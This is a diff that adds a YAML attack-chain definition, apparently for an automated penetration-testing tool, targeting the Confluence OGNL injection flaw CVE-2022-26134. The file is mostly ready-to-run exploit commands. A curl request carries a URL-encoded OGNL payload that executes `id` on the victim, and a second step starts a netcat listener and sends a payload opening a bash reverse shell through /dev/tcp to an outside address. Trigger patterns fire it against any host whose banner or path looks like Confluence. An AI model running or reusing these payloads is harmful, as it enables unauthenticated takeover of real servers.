@@ -1,0 +1,32 @@
+chain_id: confluence_ognl_cve_2022_26134
+title: "Confluence OGNL — CVE-2022-26134 unauth RCE via URL-path injection"
+severity: CRITICAL
+tags: [web, confluence, atlassian, cve-2022-26134, ognl, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-26134" }
+    - { banner_pattern: "(?i)atlassian|confluence" }
+    - { path_pattern: "(?i)/(login\\.action|dologin\\.action|conflu)" }
+
+description: |
+  Confluence Server / Data Center 1.3.0 → 7.18.0 (most production
+  installations) blindly evaluated OGNL expressions placed in the URL
+  path. A single curl gets RCE — no authentication, no body, no headers.
+  This was actively exploited in the wild before the patch landed.
+
+steps:
+  - id: 1
+    title: "Confirm — the response will include the value of `id`"
+    command: |
+      curl -s "http://$VICTIMA/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -i | grep -i "x-cmd-response"
+
+  - id: 2
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      # URL-encode `bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'`
+      curl "http://$VICTIMA/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28new+java.lang.String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.2.15%2F4444+0%3E%261%22%7D%29%7D/"
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-26134
